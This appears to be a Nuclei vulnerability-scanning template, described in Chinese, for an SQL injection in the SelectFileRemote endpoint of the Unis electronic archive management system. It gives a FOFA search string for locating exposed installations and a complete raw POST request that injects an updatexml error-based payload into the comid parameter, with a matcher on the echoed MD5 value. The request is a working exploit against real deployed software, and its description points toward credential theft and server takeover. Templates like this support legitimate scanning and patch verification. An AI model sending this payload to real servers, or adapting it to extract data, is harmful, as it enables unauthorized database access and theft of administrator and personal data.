id: ziguangdianzi-selectFileRemote-sql

info:
  name: "紫光电子档案管理系统 SelectFileRemote 接口 SQL 注入"
  author: Unknown
  severity: high
  description: |-
    fofa: body="www.unissoft.com"
      紫光电子档案管理系统在 SelectFileRemote 接口实现中未正确过滤用户输入的 SQL 特殊字符，导致攻击者可通过构造恶意请求执行任意 SQL 语句。该缺陷允许远程未认证用户直接访问数据库内容，包括敏感数据如管理员凭证及用户个人信息。在具备高权限数据库访问能力的情况下，攻击者可能进一步通过 SQL 扩展功能执行系统命令或部署持久化恶意负载，最终实现对服务器的完全控制。
  reference:
  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487235&idx=1&sn=25f8a0b4ebc42cf005e8183f5256e51e&chksm=c267ba30f5103326d99ede96b761468f0da2eb174293443821dccd30fbecbd871a42791191c3&token=101124693&lang=zh_CN#rd
  tags: 紫光电子档案管理系统


http:
- raw:
  - |
    POST /Archive/ErecordManage/selectFileRemote HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
    Content-Type: application/x-www-form-urlencoded

    userID=admin&fondsid=1&comid=' and updatexml(1,concat(0x7e,MD5(123456),0x7e),1)=1
  matchers:
  - type: word
    part: body
    words:
    - '~e10adc3949ba59abbe56e057f20f883'






